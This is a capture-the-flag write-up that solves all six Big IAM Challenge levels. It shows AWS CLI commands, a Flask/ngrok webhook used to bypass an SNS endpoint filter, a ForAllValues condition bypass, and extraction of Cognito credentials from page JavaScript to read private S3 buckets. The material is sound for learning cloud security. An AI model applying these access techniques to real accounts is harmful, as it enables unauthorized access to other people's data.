---
title: "The Big IAM Challenge All Solution"
date: 2025-07-25
draft: false
author: "Lychnobyte"
tags:
  - cloud
  - aws
  - iam
  - s3
  - sqs
  - sns
  - cognito
image: "https://cdn.hashnode.com/res/hashnode/image/upload/v1753462852139/62df486c-4951-4890-8b3d-554d17b63f5f.jpeg"
description: "Walkthrough for all 6 challenges in The Big IAM Challenge, covering S3, SQS, SNS, and Cognito."
toc: true
---

> **_Cover Illustration source_** [https://www.pixiv.net/en/artworks/104049290](https://www.pixiv.net/en/artworks/104049290)

Hello all, let’s continue to solve another cloud security challenges!

This opportunity i’ll write solution for challenges in `The Big IAM challenge` platform. The challenges still up and running can access at [https://thebigiamchallenge.com/](https://thebigiamchallenge.com/).

The platform only has 6 simple AWS challenges with `wargames` style which is we need to solve the challenge in sequence from 1 to 6.

Since all the challenges i could say pretty simple and straightforward so i decide to post all solution in one post only.

Let’s start to solve those challenges!

## 1. Buckets of Fun

First challenge description

> We all know that public buckets are risky. But can you find the flag?

and we got aws IAM policy like this.

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```

So, basically we can `get` all object inside `thebigiamchallenge-storage-9979f4b` s3 bucket and `list` object inside `files` directory.

Access the s3 bucket using browser using s3 bucket url pattern `http://<bucket-name>.s3.amazonaws.com`. In our case the url `http://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com`

![S3 Bucket](https://cdn.hashnode.com/res/hashnode/image/upload/v1753463953039/b16392ee-ceae-40a7-acba-5be4a57b8702.png)

As we can see there is object `files/flag1.txt`. Just open it using browser to get the flag

![Flag 1](https://cdn.hashnode.com/res/hashnode/image/upload/v1753464071866/58c775f7-0786-44c3-946f-83b197cb201d.png)

## 2. Analytics

Continue to second challenge

> We created our own analytics system specifically for this challenge. We think it's so good that we even used it on this page. What could go wrong?
>
> Join our queue and get the secret flag.

and AWS IAM policy like this

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

Well, the challenge description say it clearly that we just need to join the queue to get the flag!

To receive the message in the provided queue we can use this command

```bash
aws sqs receive-message --queue-url <queue-url>
```

Sqs queue url pattern in aws is `https:/<queue-endpoint>/<account-id>/<resource-name>`.

Queue endpoint for each region are listed in this documentation [https://docs.aws.amazon.com/general/latest/gr/sqs-service.html](https://docs.aws.amazon.com/general/latest/gr/sqs-service.html).

`Account id` for this challenge is `092297851374` and `resource name` is `wiz-tbic-analytics-sqs-queue-ca7a1b2`.

So, sqs queue url for this challenge is [`https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2`](https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2).

We just need to run this command in platform provided web shell

```bash
aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
```

![SQS Receive](https://cdn.hashnode.com/res/hashnode/image/upload/v1753465074043/25f3d8ba-3171-440e-aa29-c3b76bad4ac2.png)

Then just access the url from message body to get the flag.

![Flag 2](https://cdn.hashnode.com/res/hashnode/image/upload/v1753465122744/3a8ec994-c6e7-47b6-a6cb-e6f3e5b0d5b7.png)

## 3. Enable Push Notifications

Continue to third challenge

> We got a message for you. Can you get it?

and AWS IAM policy like this

```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

Now we need to subscribe to `SNS` topic to receive the flag. But, there is some `filter` that the receiver url need to end with string `@tbic.wiz.io`.

My approach is to create webhook with endpoint `@tbic.wiz.io`. To have full control with the webhook, i use `ngrok` and create python webhook with flask.

Well, you can also use some webhook service out there in the internet.

Here the webhook script i use.

```python
from flask import Flask, request, jsonify
import requests
import json

app = Flask(__name__)

@app.route('/webhook@tbic.wiz.io', methods=['POST'])
def webhook():
    msg_data = json.loads(request.data.decode())

    msg_type = msg_data['Type']

    if msg_type == 'SubscriptionConfirmation':
        subscribe_url = msg_data['SubscribeURL']
        print(f"[+] Confirming subscription: {subscribe_url}")
        try:
            response = requests.get(subscribe_url)
            print(f"[+] Subscription confirmed: HTTP {response.status_code}")
        except Exception as e:
            print(f"[!] Failed to confirm subscription: {e}")
            return "Failed", 500

    elif msg_type == 'Notification':
        message = msg_data['Message']
        print(f"[+] Notification received: {message}")

    else:
        print(f"[!] Unsupported message type: {msg_type}")

    return jsonify({'status': 'ok'}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

Then run the `ngrok` . (for the setup you can follow the steps official documentation)

```python
ngrok http http://localhost:5000
python3 webhook.py
```

Then you have endpoint that can be use as `sns` endpoint.

![Ngrok Setup](https://cdn.hashnode.com/res/hashnode/image/upload/v1753468762185/291d5330-f5fa-45f7-8dec-690ce6b7a9a2.png)

Now we just need to run this command in web shell to subscribe the `sns` topic and wait a while to webhook receive the flag.

```python
aws sns subscribe \
    --topic-arn "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications" \
    --protocol https --notification-endpoint https://45c2275ab043.ngrok-free.app/webhook@tbic.wiz.io
```

That’s it we got the third flag

![Flag 3](https://cdn.hashnode.com/res/hashnode/image/upload/v1753468968674/e3299625-f866-4472-b5e9-c9341828ddba.png)

## 4. Admin only?

Next to forth challenge

> We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?

and AWS IAM policy like this

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

The IAM policy structure looks similar with the first challenge the different just additional `filter` to `list` bucket objects that make sure the request need to come from `user/admin`.

Seems like the `filter` is good but is `ForAllValues:StringLike` operator is bypass-able.

As written in aws documentation [https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-single-vs-multi-valued-context-keys.html#reference_policies_condition-multi-valued-context-keys](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-single-vs-multi-valued-context-keys.html#reference_policies_condition-multi-valued-context-keys)

> The `ForAllValues` qualifier tests whether the value of every member of the request context matches the condition operator that follows the qualifier. The condition returns `true` if every context key value in the request matches a context key value in the policy. It also returns `true` if there are no context keys in the request.

So, basically if our request not have context `PrincipalArn` or any `credentials` our request will be allowed to access s3 bucket objects.

To make request without any credentials loaded we use option `--no-sign-request`

> --no-sign-request (boolean)
>
> Do not sign requests. Credentials will not be loaded if this argument is provided.

Then just run command below to `list` and `get` flag.

```bash
aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files --no-sign-request
aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt - --no-sign-request
```

![Flag 4](https://cdn.hashnode.com/res/hashnode/image/upload/v1753470357149/64545e11-e29b-4763-afef-51d3eee53ef2.png)

## 5. Do I know you?

Fifth challenge

> We configured AWS Cognito as our main identity provider. Let's hope we didn't make any mistakes.

and AWS IAM policy like this

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```

As description said that the platform use AWS Cognito as identity provider, i assume this page also use AWS Cognito too. Also because in this challenge page load a picture that seems kinda suspicious.

So, let see the page source code (if using chrome use `ctrl + u`) we see this `javascript code`

```javascript
<script src="https://sdk.amazonaws.com/js/aws-sdk-2.719.0.min.js"></script>
<script>
  AWS.config.region = 'us-east-1';
  AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"});
  // Set the region
  AWS.config.update({region: 'us-east-1'});

  $(document).ready(function() {
    var s3 = new AWS.S3();
    params = {
      Bucket: 'wiz-privatefiles',
      Key: 'cognito1.png',
      Expires: 60 * 60
    }

    signedUrl = s3.getSignedUrl('getObject', params, function (err, url) {
      $('#signedImg').attr('src', url);
    });
});
</script>
```

Well, the page retrieve AWS credentials from Cognito pools then stored in `AWS.config.credentials` variable. Since it is `javascript` code, we can get that credentials from web console.

Then open the web console (if using chrome use `F12` the choose `console` tab)

To get the AWS credentials type this line in console

```javascript
AWS.config.credentials.accessKeyId
AWS.config.credentials.secretAccessKey
AWS.config.credentials.sessionToken
```

![Cognito Credentials](https://cdn.hashnode.com/res/hashnode/image/upload/v1753471912188/9d53b7cb-50fa-4f28-a962-71af74630e39.png)

Then open local terminal (because in web shell we cannot set AWS credentials) to configure AWS cli to use the credentials. In linux open file `~/.aws/credentials` then write this line

```bash
[bigiam]
aws_access_key_id = <access-id>
aws_secret_access_key = <secret-id>
aws_session_token = <session-token>
```

Then access the S3 bucket to get the flag

```bash
aws --profile bigiam s3 ls s3://wiz-privatefiles/
aws --profile bigiam s3 cp s3://wiz-privatefiles/flag1.txt -
```

![Flag 5](https://cdn.hashnode.com/res/hashnode/image/upload/v1753472461083/3dfe337b-c103-4935-8c0a-3d8fc7bd4ebc.png)

## 6. One final push

Last challenge!

> Anonymous access no more. Let's see what can you do now.
>
> Now try it with the authenticated role: *arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role*

and AWS IAM policy

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```

Last challenge is using Cognito again and now we got access to assume with web identity.

So, all we need to do is get the identity from Cognito

```bash
aws cognito-identity get-id --region us-east-1 --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
```

Get the JWT with identity we got before

```bash
aws cognito-identity get-open-id-token --region us-east-1 --identity-id us-east-1:157d6171-ee06-cefb-6881-51ea5f1b6a9d
```

![JWT identity](https://cdn.hashnode.com/res/hashnode/image/upload/v1753473153969/28f672cf-32a6-475a-9869-fb94b8a99890.png)

Then we can assume role in description with our JWT to get AWS credentials

```bash
aws sts assume-role-with-web-identity --role-session-name challenge-6 --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --web-identity-token <JWT>
```

![Assumed Role Creds](https://cdn.hashnode.com/res/hashnode/image/upload/v1753473372911/fd91340c-8064-4fea-80ee-7abd925b7510.png)

Just like previous challenge create `credentials` in our local terminal, then with that profile list s3 bucket.

```bash
aws --profile bigiam6 s3 ls
aws --profile bigiam6 s3 ls s3://wiz-privatefiles-x1000
aws --profile bigiam6 s3 cp s3://wiz-privatefiles-x1000/flag2.txt -
```

Well, there is many S3 bucket listed i checked one by one then found flag in `wiz-privatefiles-x1000` bucket.

![Flag 6](https://cdn.hashnode.com/res/hashnode/image/upload/v1753473739007/d224267a-9a93-4b2a-a44c-b979190a16d6.png)

That’s it! We solve all challenges!

After solve all challenges we can got certificate like this

![Certificate](https://thebigiamchallenge.com/image/IVdl4KBB)

**Reference:**

* [https://docs.aws.amazon.com/general/latest/gr/sqs-service.html](https://docs.aws.amazon.com/general/latest/gr/sqs-service.html)

* [https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-single-vs-multi-valued-context-keys.html#reference_policies_condition-multi-valued-context-keys](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-single-vs-multi-valued-context-keys.html#reference_policies_condition-multi-valued-context-keys)
